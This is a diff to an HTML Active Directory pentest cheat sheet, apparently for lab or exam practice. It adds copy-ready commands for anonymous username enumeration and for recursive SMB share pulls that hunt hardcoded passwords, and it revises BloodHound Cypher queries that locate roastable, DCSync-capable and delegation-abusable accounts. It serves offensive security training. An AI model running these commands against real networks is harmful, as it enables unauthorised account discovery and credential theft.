@@ -425,6 +425,7 @@
         <li><a href="#unauth-smb">SMB Null Session</a></li>
         <li><a href="#unauth-ldap">LDAP Anonymous</a></li>
         <li><a href="#unauth-kerb">Kerbrute User Enum</a></li>
+        <li><a href="#unauth-user-enum">👥 Anon User Enum (5 methods)</a></li>
         <li><a href="#unauth-asrep">AS-REP (no creds)</a></li>
       </ul>
     </div>
@@ -440,6 +441,7 @@
       <ul>
         <li><a href="#bloodhound">BloodHound</a></li>
         <li><a href="#auth-enum">Enumeration</a></li>
+        <li><a href="#share-content">📂 Share Content Recursion</a></li>
         <li><a href="#ldap-mining">🔍 LDAP Attr Mining</a></li>
         <li><a href="#sysvol">SYSVOL / GPP</a></li>
         <li><a href="#encoded">🔓 Encoded Creds</a></li>
@@ -456,9 +458,12 @@
         <li><a href="#mssql">MSSQL Chains</a></li>
         <li><a href="#adcs">ADCS Attacks</a></li>
         <li><a href="#kerb-errors">Kerberos Errors</a></li>
+        <li><a href="#hashcat-wsl">🔧 Hashcat WSL Fix</a></li>
+        <li><a href="#winrm-pwnd-warning">⚠️ Pwn3d! ≠ Admin</a></li>
         <li><a href="#tool-errors">Tool Errors</a></li>
         <li><a href="#lockout">Lockout Math</a></li>
         <li><a href="#stuck">Stuck Checklist</a></li>
+        <li><a href="#hash-extraction">💰 Hash Extraction</a></li>
         <li><a href="#dcsync">DCSync + Proof</a></li>
       </ul>
     </div>
@@ -921,6 +926,94 @@ cat ~/exam/loot/kerbrute_users.txt | grep "VALID" | awk '{print $7}' &gt; ~/exam
       </div>
 </div>
 </details>
+<details class="sec-detail" id="unauth-user-enum">
+<summary>👥 Anonymous User Enumeration — 5 Methods, Try All</summary>
+<div class="sec-body">
+<div class="note n-good">Different protocols leak usernames via different mechanisms. When one method returns 0 valid users, try the others — they have different ACL gates. <strong>Real friction from Vulnnet:Roasted — kerbrute returned 0, impacket-lookupsid returned 9 users.</strong></div>
+
+<table class="qref-table">
+<thead><tr><th style="width:25%">Method</th><th style="width:25%">Protocol</th><th style="width:25%">Anon?</th><th style="width:25%">Notes</th></tr></thead>
+<tbody>
+<tr><td><code>kerbrute userenum</code></td><td>Kerberos (pre-auth probe)</td><td>Yes</td><td>Default expected method. Can be silenced by DC config (returns 0 for everything).</td></tr>
+<tr><td><code>impacket-lookupsid</code></td><td>MS-LSAT / LSARPC</td><td>Yes</td><td>⭐ RID cycles via LSA — works when Kerberos is muted. Often THE winner on labs.</td></tr>
+<tr><td><code>nxc smb --rid-brute</code></td><td>MS-SAMR</td><td>Yes</td><td>Same as rpcclient via SAMR API — different client/timing.</td></tr>
+<tr><td><code>rpcclient enumdomusers</code></td><td>MS-SAMR</td><td>Sometimes</td><td>Blocked by RestrictAnonymous=2 (rare these days).</td></tr>
+<tr><td><code>enum4linux-ng -r</code></td><td>Mixed (SMB + RPC)</td><td>Yes</td><td>Combines methods. Good first sweep but verbose output.</td></tr>
+<tr><td><code>ldapsearch anonymous bind</code></td><td>LDAP</td><td>Rare</td><td>Most modern AD disables. Try anyway.</td></tr>
+</tbody>
+</table>
+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">parallel anonymous user enumeration — try all 5</span><div class="cb-tags"><span class="tag t-crit">essential</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> Runs all five anonymous enumeration methods and combines results. Different protocols leak users through different LSA/SAMR/Kerberos endpoints — when one is gated, others often aren't.</div>
+<pre><span class="c"># 1. Kerbrute (Kerberos pre-auth):</span>
+kerbrute userenum -d $DOMAIN --dc $DC_IP \
+  /usr/share/seclists/Usernames/Names/names.txt \
+  -o enum/kerbrute-users.txt 2&gt;/dev/null
+
+<span class="c"># 2. impacket-lookupsid (LSARPC RID cycling) — ⭐ often the winner:</span>
+impacket-lookupsid anonymous@$DC_IP 20000 2&gt;/dev/null | \
+  grep "SidTypeUser" | awk -F'\' '{print $2}' | awk '{print $1}' \
+  &gt; enum/lookupsid-users.txt
+
+<span class="c"># 3. nxc RID brute (via SMB SAMR):</span>
+nxc smb $DC_IP -u '' -p '' --rid-brute 10000 2&gt;/dev/null | \
+  grep -i "SidTypeUser" | awk '{print $6}' | cut -d'\' -f2 \
+  &gt; enum/nxc-rid.txt
+
+<span class="c"># 4. rpcclient enumdomusers (also SAMR but different client):</span>
+rpcclient -U "" -N $DC_IP -c "enumdomusers" 2&gt;/dev/null | \
+  grep -oP 'user:\[\K[^\]]+' \
+  &gt; enum/rpc-users.txt
+
+<span class="c"># 5. enum4linux-ng RID cycling:</span>
+enum4linux-ng -r $DC_IP -R 10000 -oA enum/enum4linux 2&gt;/dev/null
+
+<span class="c"># Combine + dedupe results:</span>
+cat enum/lookupsid-users.txt enum/nxc-rid.txt enum/rpc-users.txt 2&gt;/dev/null | \
+  sort -u | grep -v '^$' &gt; loot/users.txt
+wc -l loot/users.txt
+cat loot/users.txt</pre></div>
+
+<div class="note n-warn"><strong>🐛 kerbrute input format gotcha:</strong> DO NOT include <code>@domain</code> in the user list — kerbrute appends the realm itself. Input must be bare usernames (<code>alexa.whitehat</code>, not <code>alexa.whitehat@corp.local</code>). Also note: lab AD often uses <code>first-letter-hyphen-lastname</code> format (<code>a-whitehat</code>) rather than the corporate <code>first.last</code> convention. Use <a href="https://github.com/urbanadventurer/username-anarchy">username-anarchy</a> to generate format variants from scraped names.</div>
+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">username format variants — username-anarchy</span><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> Generates every plausible AD username convention from a list of full names. Useful when you scraped names from a web page and don't know the org's username format.</div>
+<pre><span class="c"># One-time setup:</span>
+git clone https://github.com/urbanadventurer/username-anarchy.git ~/tools/username-anarchy
+
+<span class="c"># Names file (one "First Last" per line):</span>
+cat &gt; names.txt &lt;&lt;'EOF'
+Alexa Whitehat
+Jack Goldenhand
+Tony Skid
+Johnny Leet
+EOF
+
+<span class="c"># Generate variants — produces alexa, alexa.whitehat, awhitehat,</span>
+<span class="c"># a-whitehat, whitehata, alexa_whitehat, Alexa.Whitehat, etc:</span>
+~/tools/username-anarchy/username-anarchy -i names.txt &gt; loot/users-variants.txt
+wc -l loot/users-variants.txt
+<span class="c"># Then feed to kerbrute:</span>
+kerbrute userenum -d $DOMAIN --dc $DC_IP loot/users-variants.txt</pre></div>
+
+<div class="sig">
+<span class="sig-title">interpretation</span>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">All 5 methods return 0 users</span></span>
+<span class="sig-note">Either DC is hardened (RestrictAnonymous=2 AND Kerberos pre-auth doesn't leak) OR wrong $DOMAIN / $DC_IP. Verify vars first. If correct, you need credentials before user enum — try web app vectors, default creds, password spray with a generic list.</span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Kerbrute returns 0, lookupsid returns many</span></span>
+<span class="sig-note">DC is muted on Kerberos but LSA is open. Use lookupsid output as your users.txt. Run AS-REP roast against it — preauth-disabled accounts may exist.</span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">Found service-account-named user (svc_*, *-svc, enterprise-*, monitoring-*)</span></span>
+<span class="sig-note">Prioritize. Service accounts often have SPNs (Kerberoastable) and stale weak passwords.</span>
+</div>
+</div>
+</div>
+</details>
+
 <details class="sec-detail" id="unauth-asrep">
 <summary>🔓 AS-REP Roasting — No Creds Required<span class="tag t-crit" style="margin-left:auto;margin-right:1rem;">free hashes</span></summary>
 <div class="sec-body">
@@ -1426,7 +1519,7 @@ Get-ObjectAcl -SamAccountName $USER -ResolveGUIDs  <span class="c"># ACLs on a u
 
 <div class="note n-warn" style="margin-top:1rem;"><strong>⚡ CE-specific Cypher limitations:</strong> CE is READ-ONLY in the Cypher tab. These keywords are BLOCKED: <code>SET</code>, <code>DELETE</code>, <code>DETACH DELETE</code>, <code>CREATE</code>, <code>MERGE</code>, <code>REMOVE</code>. To mark nodes as Owned: use UI right-click → "Mark User as Owned" (works in CE). To clear data between engagements: Administration → Database Management → Clear Database. All MATCH/RETURN/WHERE/WITH queries below work fine.</div>
 
-<div class="note n-warn"><strong>⚡ Cypher placeholders need manual substitution:</strong> Queries below use <code>$USER@$REALM</code> etc. as placeholders. CE Cypher does NOT expand bash variables — replace them with literal UPPERCASE strings before pasting. Example: <code>"$USER@$REALM"</code> → <code>"LDAP@SUPPORT.HTB"</code>. Always run <code>MATCH (d:Domain) RETURN d.name</code> first to confirm exact realm format BloodHound stored.</div>
+<div class="note n-warn"><strong>⚡ Cypher placeholders need manual substitution:</strong> Queries below use <code>$USER@$REALM</code> etc. as placeholders. CE Cypher does NOT expand bash variables — replace them with literal UPPERCASE strings before pasting. Example: <code>"$USER@$REALM"</code> → <code>"LDAP@SUPPORT.HTB"</code>. Always run <code>MATCH (d:Domain) RETURN d   <span class="c">// node renders graph; .name shows in Table tab</span></code> first to confirm exact realm format BloodHound stored.</div>
 
 <h3 style="margin:1.2rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">⚡ Triage — Rich graph or thin graph?</h3>
 <div class="note n-bad"><strong>BloodHound isn't always the path.</strong> If your initial cred is a read-restricted service account (LDAP-only, read-only API), BH will return thin data and look like a dead end. Run these 3 triage queries IMMEDIATELY after ingest to know if you should trust BH or pivot to content enum.</div>
@@ -1434,15 +1527,18 @@ Get-ObjectAcl -SamAccountName $USER -ResolveGUIDs  <span class="c"># ACLs on a u
 <div class="cb"><div class="cb-head"><span class="cb-lbl">3 triage queries — run right after ingest</span><div class="cb-tags"><span class="tag t-crit">30-second check</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
 <div class="cb-desc"><strong>What this does:</strong> Tells you if BloodHound has enough data to be useful, or if you have a restricted-account scenario where BH is misleading.</div>
 <pre><span class="c">// 1. Object count by type — sanity check on collection</span>
+<span class="c">// NOTE: CE often shows "No results match" for aggregate queries even when data exists.</span>
+<span class="c">// Switch to "Table" view if graph is empty. Or just confirm data with:</span>
+<span class="c">//   MATCH (d:Domain) RETURN d   ← if a node renders, data IS there.</span>
 MATCH (n) RETURN labels(n)[0] AS type, count(*) AS count ORDER BY count DESC
 
-<span class="c">// 2. What does YOUR user have outbound edges to?</span>
-MATCH (u:User {name:"YOUR_USER@REALM"})-[r]-&gt;(n)
-RETURN u.name, type(r), labels(n)[0], n.name
+<span class="c">// 2. What does YOUR user have outbound edges to? (graph renders)</span>
+MATCH p=(u:User {name:"YOUR_USER@REALM"})-[r]-&gt;(n) RETURN p
+<span class="c">// Or for table-view summary instead of graph:</span>
+<span class="c">//   MATCH (u:User {name:"YOUR_USER@REALM"})-[r]-&gt;(n) RETURN u.name, type(r), n.name</span>
 
-<span class="c">// 3. Are Domain Admins members visible at all?</span>
-MATCH (u:User)-[:MemberOf*1..]-&gt;(g:Group {name:"DOMAIN ADMINS@REALM"})
-RETURN u.name</pre></div>
+<span class="c">// 3. Are Domain Admins members visible at all? (graph renders)</span>
+MATCH p=(u:User)-[:MemberOf*1..]-&gt;(g:Group {name:"DOMAIN ADMINS@REALM"}) RETURN p</pre></div>
 
 <table class="qref-table">
 <thead><tr><th style="width:30%">Triage result</th><th style="width:30%">What it means</th><th style="width:40%">What to do</th></tr></thead>
@@ -1532,17 +1628,26 @@ unzip *_bloodhound.zip -d bh_files/
 
 <h3 style="margin:1.2rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">🔑 4. Cypher Library — Paste &amp; Go</h3>
 <div class="note n-info">The UI changes between versions; Cypher is stable. Click <strong>EXPLORE → CYPHER</strong> tab, paste any query below, hit run.</div>
+<div class="note n-warn"><strong>⚡ CE Cypher rules — read once, apply always:</strong>
+<table style="margin-top:0.5rem;border-collapse:collapse;width:100%;font-size:0.9rem;">
+<tr><td style="padding:0.25rem;border-bottom:1px solid #444;width:50%;"><code>RETURN n</code> / <code>RETURN p</code> (node / path)</td><td style="padding:0.25rem;border-bottom:1px solid #444;">✅ Renders as graph</td></tr>
+<tr><td style="padding:0.25rem;border-bottom:1px solid #444;"><code>RETURN n.name, n.description</code> (properties)</td><td style="padding:0.25rem;border-bottom:1px solid #444;">✅ Shows in <strong>Table tab</strong> (NOT graph) — click Table after running</td></tr>
+<tr><td style="padding:0.25rem;border-bottom:1px solid #444;"><code>RETURN count(*) AS x</code> (aggregates)</td><td style="padding:0.25rem;border-bottom:1px solid #444;">⚠️ Often misleadingly shows "No results match" — check Table tab</td></tr>
+<tr><td style="padding:0.25rem;border-bottom:1px solid #444;"><code>SET</code> / <code>DELETE</code> / <code>CREATE</code> / <code>MERGE</code> / <code>REMOVE</code></td><td style="padding:0.25rem;border-bottom:1px solid #444;">❌ BLOCKED — CE Cypher is read-only. Use UI right-click for Mark Owned, Database Management for clears</td></tr>
+<tr><td style="padding:0.25rem;border-bottom:1px solid #444;"><code>shortestPath(...)</code> with newline INSIDE parens</td><td style="padding:0.25rem;border-bottom:1px solid #444;">❌ Parser fails: <code>no viable alternative at input</code>. Keep <code>shortestPath(...)</code> on one line.</td></tr>
+<tr><td style="padding:0.25rem;"><strong>Sanity check</strong></td><td style="padding:0.25rem;"><code>MATCH (d:Domain) RETURN d</code> — if a node draws, data IS ingested. If not, re-ingest.</td></tr>
+</table></div>
 
 <div class="cb"><div class="cb-head"><span class="cb-lbl">Enumeration — what's in the domain</span><button class="cpb" onclick="cp(this)">copy</button></div>
 <div class="cb-desc"><strong>What this does:</strong> Survey the domain — counts, domain admins, high-value targets, naming format check.</div>
 <pre><span class="c">// Confirm domain name format (everything else uses uppercase):</span>
-MATCH (d:Domain) RETURN d.name
+MATCH (d:Domain) RETURN d   <span class="c">// node renders; .name shows in Table tab</span>
 
 <span class="c">// List all Domain Admins members:</span>
-MATCH (u:User)-[:MemberOf*1..]-&gt;(g:Group {name:"DOMAIN ADMINS@$REALM"}) RETURN u.name
+MATCH p=(u:User)-[:MemberOf*1..]-&gt;(g:Group {name:"DOMAIN ADMINS@$REALM"}) RETURN p
 
 <span class="c">// All high-value targets (default sensitive groups):</span>
-MATCH (n {highvalue:true}) RETURN n.name, labels(n)
+MATCH (n {highvalue:true}) RETURN n   <span class="c">// graph; use n.name, labels(n) for Table tab</span>
 
 <span class="c">// Count of each object type:</span>
 MATCH (n) RETURN labels(n)[0] AS type, count(*) AS count ORDER BY count DESC</pre></div>
@@ -1550,39 +1655,36 @@ MATCH (n) RETURN labels(n)[0] AS type, count(*) AS count ORDER BY count DESC</pr
 <div class="cb"><div class="cb-head"><span class="cb-lbl">Credential attacks — find roastable accounts</span><button class="cpb" onclick="cp(this)">copy</button></div>
 <div class="cb-desc"><strong>What this does:</strong> Identify accounts vulnerable to Kerberoasting / AS-REP roasting / password issues. Filter krbtgt false positive.</div>
 <pre><span class="c">// Kerberoastable users (EXCLUDING krbtgt false positive):</span>
-MATCH (u:User {hasspn:true}) WHERE NOT u.name STARTS WITH "KRBTGT"
-RETURN u.name, u.description, u.serviceprincipalnames
+MATCH (u:User {hasspn:true}) WHERE NOT u.name STARTS WITH "KRBTGT" RETURN u
+<span class="c">// For Table tab w/ SPN details: ...RETURN u.name, u.serviceprincipalnames</span>
 
 <span class="c">// AS-REP roastable (pre-auth disabled):</span>
-MATCH (u:User {dontreqpreauth:true}) RETURN u.name, u.description
+MATCH (u:User {dontreqpreauth:true}) RETURN u
 
 <span class="c">// Users with password in description field (lazy admins):</span>
-MATCH (u:User) WHERE u.description =~ "(?i).*(password|pwd|pass|cred).*"
-RETURN u.name, u.description
+MATCH (u:User) WHERE u.description =~ "(?i).*(password|pwd|pass|cred).*" RETURN u
+<span class="c">// Switch to Table tab to read full description content</span>
 
 <span class="c">// Pre-Windows 2000 compatible accounts (password = lowercase machine name):</span>
-MATCH (u:User) WHERE u.useraccountcontrol IS NOT NULL
-AND u.useraccountcontrol IN [4128, 4096] RETURN u.name
+MATCH (u:User) WHERE u.useraccountcontrol IS NOT NULL AND u.useraccountcontrol IN [4128, 4096] RETURN u
 
 <span class="c">// Users with passwordneverexpires (often weak):</span>
-MATCH (u:User {pwdneverexpires:true}) WHERE NOT u.name STARTS WITH "KRBTGT"
-RETURN u.name, u.description</pre></div>
+MATCH (u:User {pwdneverexpires:true}) WHERE NOT u.name STARTS WITH "KRBTGT" RETURN u</pre></div>
 
 <div class="cb"><div class="cb-head"><span class="cb-lbl">Path-finding — shortest paths to DA</span><div class="cb-tags"><span class="tag t-crit">core</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
 <div class="cb-desc"><strong>What this does:</strong> The kill-chain queries. Use the realm value from query #1 (in CAPS).</div>
 <pre><span class="c">// Shortest path from a specific user to DA:</span>
-MATCH p=shortestPath((u:User {name:"$USER@$REALM"})-[*1..]-&gt;(g:Group {name:"DOMAIN ADMINS@$REALM"}))
-RETURN p
+MATCH p=shortestPath((u:User {name:"$USER@$REALM"})-[*1..]-&gt;(g:Group {name:"DOMAIN ADMINS@$REALM"})) RETURN p
 
-<span class="c">// Mark user as owned (UI right-click fails sometimes — use this):</span>
-MATCH (u:User {name:"$USER@$REALM"}) SET u.owned=true RETURN u.name, u.owned
+<span class="c">// Mark as owned in CE — Cypher SET is BLOCKED. Use UI instead:</span>
+<span class="c">// Right-click the user node in graph → "Mark User as Owned"</span>
+<span class="c">// (CE's read-only Cypher means MATCH ... SET fails with "Updating clauses not supported")</span>
 
 <span class="c">// Shortest path from ANY owned principal to DA:</span>
-MATCH p=shortestPath((u {owned:true})-[*1..]-&gt;(g:Group {name:"DOMAIN ADMINS@$REALM"}))
-RETURN p
+MATCH p=shortestPath((u {owned:true})-[*1..]-&gt;(g:Group {name:"DOMAIN ADMINS@$REALM"})) RETURN p
 
-<span class="c">// Reset all owned flags (clean slate):</span>
-MATCH (n) WHERE n.owned=true SET n.owned=false RETURN count(n)</pre></div>
+<span class="c">// Reset owned flags in CE — Cypher SET blocked.</span>
+<span class="c">// Use Administration → Database Management to reset, or right-click in UI.</span></pre></div>
 
 <div class="cb"><div class="cb-head"><span class="cb-lbl">ACL abuse — find paths to compromise</span><button class="cpb" onclick="cp(this)">copy</button></div>
 <div class="cb-desc"><strong>What this does:</strong> Find outbound permissions you can abuse — GenericAll/Write, WriteDACL, ForceChangePassword, AddMember.</div>
@@ -1613,9 +1715,8 @@ MATCH p=(n)-[:GetChanges|GetChangesAll|DCSync]-&gt;(d:Domain) RETURN p
 MATCH p=(u:User)-[:GetChanges|GetChangesAll|DCSync]-&gt;(d:Domain) RETURN p
 
 <span class="c">// Users with BOTH GetChanges AND GetChangesAll (true DCSync, not partial):</span>
-MATCH (u:User)-[:GetChanges]-&gt;(d:Domain)
-MATCH (u)-[:GetChangesAll]-&gt;(d)
-RETURN u.name, d.name
+MATCH p=(u:User)-[:GetChanges|GetChangesAll]-&gt;(d:Domain) RETURN p
+<span class="c">// Returns ALL DCSync-capable users with paths to domain. Filter for non-default with WHERE clauses.</span>
 
 <span class="c">// DCSync via group membership (most common in real environments):</span>
 MATCH p=(u:User)-[:MemberOf*1..]-&gt;(g:Group)-[:GetChanges|GetChangesAll|DCSync]-&gt;(d:Domain)
@@ -1624,12 +1725,10 @@ RETURN p</pre></div>
 <div class="cb"><div class="cb-head"><span class="cb-lbl">Delegation — find delegation abuse paths</span><button class="cpb" onclick="cp(this)">copy</button></div>
 <div class="cb-desc"><strong>What this does:</strong> Find unconstrained / constrained / RBCD delegation targets. Each enables different attack chains.</div>
 <pre><span class="c">// Computers with UNCONSTRAINED delegation (excluding DCs which are expected):</span>
-MATCH (c:Computer {unconstraineddelegation:true})
-WHERE NOT (c)-[:MemberOf]-&gt;(:Group {name:"DOMAIN CONTROLLERS@$REALM"})
-RETURN c.name
+MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT (c)-[:MemberOf]-&gt;(:Group {name:"DOMAIN CONTROLLERS@$REALM"}) RETURN c
 
 <span class="c">// Users/computers with CONSTRAINED delegation:</span>
-MATCH (p)-[:AllowedToDelegate]-&gt;(c:Computer) RETURN p.name, c.name
+MATCH path=(u)-[:AllowedToDelegate]-&gt;(c:Computer) RETURN path
 
 <span class="c">// Resource-Based Constrained Delegation (RBCD) — who can attack what:</span>
 MATCH p=(u)-[:AllowedToAct]-&gt;(c:Computer) RETURN p
@@ -1649,7 +1748,7 @@ MATCH p=(u:User {owned:true})-[:AdminTo]-&gt;(c:Computer) RETURN p
 MATCH p=(u:User)-[:AdminTo]-&gt;(c:Computer) RETURN p
 
 <span class="c">// HasSession — where high-value users are logged in:</span>
-MATCH (c:Computer)-[:HasSession]-&gt;(u:User {highvalue:true}) RETURN c.name, u.name
+MATCH p=(c:Computer)-[:HasSession]-&gt;(u:User {highvalue:true}) RETURN p
 
 <span class="c">// Where can YOUR user RDP / WinRM in?</span>
 MATCH p=(u:User {name:"$USER@$REALM"})-[:CanRDP|CanPSRemote]-&gt;(c:Computer) RETURN p</pre></div>
@@ -1657,11 +1756,10 @@ MATCH p=(u:User {name:"$USER@$REALM"})-[:CanRDP|CanPSRemote]-&gt;(c:Computer) RE
 <div class="cb"><div class="cb-head"><span class="cb-lbl">ADCS — vulnerable certificate templates</span><button class="cpb" onclick="cp(this)">copy</button></div>
 <div class="cb-desc"><strong>What this does:</strong> If BloodHound ingested Certipy data, find vulnerable templates. (Newer collectors include this; older zips won't have PKI nodes.)</div>
 <pre><span class="c">// Find all CAs:</span>
-MATCH (ca:EnterpriseCA) RETURN ca.name
+MATCH (ca:EnterpriseCA) RETURN ca
 
 <span class="c">// ESC1 templates (enrollee supplies subject):</span>
-MATCH (t:CertTemplate) WHERE t.enrolleesuppliessubject = true
-AND t.requiresmanagerapproval = false RETURN t.name
+MATCH (t:CertTemplate) WHERE t.enrolleesuppliessubject = true AND t.requiresmanagerapproval = false RETURN t
 
 <span class="c">// Who can enroll in vulnerable templates:</span>
 MATCH p=(u)-[:Enroll|AutoEnroll]-&gt;(t:CertTemplate)
@@ -1670,7 +1768,7 @@ WHERE t.enrolleesuppliessubject = true RETURN p</pre></div>
 <div class="cb"><div class="cb-head"><span class="cb-lbl">LAPS — find readable local admin passwords</span><button class="cpb" onclick="cp(this)">copy</button></div>
 <div class="cb-desc"><strong>What this does:</strong> Find computers with LAPS deployed and who can read their LAPS passwords.</div>
 <pre><span class="c">// Computers with LAPS:</span>
-MATCH (c:Computer) WHERE c.haslaps = true RETURN c.name
+MATCH (c:Computer) WHERE c.haslaps = true RETURN c
 
 <span class="c">// Who can read LAPS passwords (ReadLAPSPassword edge):</span>
 MATCH p=(u:User)-[:ReadLAPSPassword]-&gt;(c:Computer) RETURN p
@@ -1687,8 +1785,7 @@ MATCH p=(d1:Domain)-[:TrustedBy]-&gt;(d2:Domain) RETURN p
 MATCH p=(u:User)-[:MemberOf]-&gt;(g:Group) WHERE u.domain &lt;&gt; g.domain RETURN p
 
 <span class="c">// Cross-domain admin paths:</span>
-MATCH p=shortestPath((u:User)-[*1..]-&gt;(g:Group))
-WHERE u.domain &lt;&gt; g.domain AND g.highvalue = true RETURN p</pre></div>
+MATCH p=shortestPath((u:User)-[*1..]-&gt;(g:Group)) WHERE u.domain &lt;&gt; g.domain AND g.highvalue = true RETURN p</pre></div>
 
 <h3 style="margin:1.2rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">🎨 5. Graph Interpretation — Read It Right</h3>
 <div class="note n-warn"><strong>Don't trust the graph blindly.</strong> BloodHound is a snapshot — what you see and what AD actually permits don't always match. Always test the actual attack.</div>
@@ -1716,7 +1813,7 @@ WHERE u.domain &lt;&gt; g.domain AND g.highvalue = true RETURN p</pre></div>
 • <strong>GenericAll → Container → Contains → DA group</strong> — looks like a path, isn't. Container permissions don't grant rights over contained objects.<br>
 • <strong>Graph shows one edge where two exist</strong> — query with Cypher to confirm. Visual lines can overlap.<br>
 • <strong>"No path" doesn't mean impossible</strong> — BH only sees AD relationships. SMB share content / SYSVOL / file-stored creds are invisible to it.<br>
-• <strong>"Mark as Owned" right-click fails</strong> — use Cypher: <code>MATCH (u:User {name:"..."}) SET u.owned=true RETURN u</code></div>
+• <strong>"Mark as Owned" via Cypher is blocked in CE</strong> — CE's Cypher tab is read-only (no SET/DELETE/CREATE). Use UI right-click on the node → "Mark User as Owned". In Legacy BloodHound, the Cypher SET method works as a fallback when right-click is buggy.</div>
 
 <h3 style="margin:1.2rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">🎯 6. Signal → Action Mapping (complete lookup)</h3>
 <div class="note n-info">This table maps every common BloodHound edge to its exploit chain. Read the edge in BH, find the row here, execute. No deep thought required.</div>
@@ -1902,31 +1999,32 @@ ls -la enum/</pre></div>
 <h3 style="margin:1rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">🧹 Output cleanup — usable files for next steps</h3>
 <div class="cb"><div class="cb-head"><span class="cb-lbl">extract clean usernames → users.txt</span><button class="cpb" onclick="cp(this)">copy</button></div>
 <div class="cb-desc"><strong>What this does:</strong> nxc output is wrapped in <code>SMB IP PORT HOSTNAME</code> prefix garbage. Strip it for usable wordlists.</div>
-<pre><span class="c"># Universal nxc cleanup — strips prefix + status lines:</span>
-nxc smb $DC_IP -u "$USER" -p "$PASS" --users 2&gt;/dev/null \
-  | awk '/-Username-/{flag=1; next} flag{print $5}' \
+<pre><span class="c"># ⚠️ PARSE THE EXISTING FILES — don't re-run nxc (which doubles network noise + event logs)</span>
+<span class="c"># All raw output is already in enum/ from the parallel sweep above.</span>
+
+<span class="c"># Clean usernames from existing dump:</span>
+awk '/-Username-/{flag=1; next} flag{print $5}' enum/nxc-users.txt \
   | grep -vE '^$|^\[' \
   | tee loot/users.txt
 
-<span class="c"># Alternative — extract from rpcclient (cleaner format):</span>
-rpcclient -U "$DOMAIN/$USER%$PASS" $DC_IP -c "enumdomusers" 2&gt;/dev/null \
-  | grep -oP 'user:\[\K[^]]+' \
-  | tee loot/users.txt
+<span class="c"># Alternative source — rpcclient output (often cleaner names):</span>
+grep -oP 'user:\[\K[^]]+' enum/rpc-users.txt &gt; loot/users-rpc.txt
 
-<span class="c"># Clean groups list:</span>
-nxc smb $DC_IP -u "$USER" -p "$PASS" --groups 2&gt;/dev/null \
-  | awk '/-Groupname-/{flag=1; next} flag{print $5}' \
+<span class="c"># Combine sources, dedupe:</span>
+cat loot/users.txt loot/users-rpc.txt 2&gt;/dev/null \
+  | sort -u &gt; loot/users-final.txt
+
+<span class="c"># Clean groups from existing dump:</span>
+awk '/-Groupname-/{flag=1; next} flag{print $5}' enum/nxc-groups.txt \
   | grep -vE '^$|^\[' \
   | tee loot/groups.txt
 
 <span class="c"># Readable + writable shares only:</span>
-nxc smb $DC_IP -u "$USER" -p "$PASS" --shares 2&gt;/dev/null \
-  | grep -E "READ|WRITE" \
+grep -E "READ|WRITE" enum/nxc-shares.txt \
   | tee loot/shares.txt
 
 <span class="c"># Password policy summary (just the relevant lines):</span>
-nxc smb $DC_IP -u "$USER" -p "$PASS" --pass-pol 2&gt;/dev/null \
-  | grep -iE "lockout|threshold|history|minimum|maximum"</pre></div>
+grep -iE "lockout|threshold|history|minimum|maximum" enum/passpol.txt</pre></div>
 
 <h3 style="margin:1rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">🔎 Grep across enum/ — find the leads</h3>
 <div class="cb"><div class="cb-head"><span class="cb-lbl">pattern matches — find creds/anomalies</span><button class="cpb" onclick="cp(this)">copy</button></div>
@@ -2082,6 +2180,102 @@ nxc smb $DC_IP -u Administrator -p 'Password123!'</pre></div>
       </div>
 </div>
 </details>
+<details class="sec-detail" id="share-content">
+<summary>📂 SMB Share Content Recursion — Pull and Grep<span class="order-tag tag-2nd" style="margin-right:1rem;">2nd</span></summary>
+<div class="sec-body">
+<div class="note n-good">After auth, any non-default share gets pulled in full and grep'd locally. <strong>Real Vulnnet:Roasted finding: hardcoded a-whitehat domain admin password sitting in <code>ResetPassword.vbs</code> on <code>\VulnNet-Business-Anonymous</code>.</strong> Admin laziness leaves cleartext creds in scripts on accessible shares constantly.</div>
+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">step 1 — enumerate shares as authed user</span><div class="cb-tags"><span class="tag t-crit">always do this</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> Lists every share visible to your authenticated user. Non-default shares (anything beyond ADMIN$, C$, IPC$, NETLOGON, SYSVOL) are 90% of the time where creds hide.</div>
+<pre><span class="c"># Quick share list:</span>
+nxc smb $DC_IP -u "$USER" -p "$PASS" --shares
+
+<span class="c"># Detailed share permissions:</span>
+smbmap -H $DC_IP -u "$USER" -p "$PASS" -d $DOMAIN
+
+<span class="c"># Same against other hosts (not just DC):</span>
+nxc smb 10.0.0.0/24 -u "$USER" -p "$PASS" --shares</pre></div>
+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">step 2 — pull every readable share recursively</span><div class="cb-tags"><span class="tag t-crit">essential</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> Downloads the FULL contents of every non-default share to a local directory. Required because grep over a mounted SMB share is painfully slow; grep over a local copy is instant.</div>
+<pre>mkdir -p shares
+
+<span class="c"># For each non-default share visible:</span>
+for SHARE in "VulnNet-Business-Anonymous" "VulnNet-Enterprise-Anonymous"; do
+  mkdir -p "shares/$SHARE"
+  smbclient "//$DC_IP/$SHARE" -U "$DOMAIN/$USER%$PASS" \
+    -c "prompt off; recurse on; lcd shares/$SHARE; mget *"
+done
+
+<span class="c"># Or with nxc spider_plus module (recursive automated):</span>
+nxc smb $DC_IP -u "$USER" -p "$PASS" -M spider_plus -o READ_ONLY=true
+<span class="c"># Output: ~/.nxc/modules/spider_plus/$DC_IP.json with file inventory + content</span>
+
+<span class="c"># List what you pulled:</span>
+find shares -type f | head -50
+du -sh shares/*</pre></div>
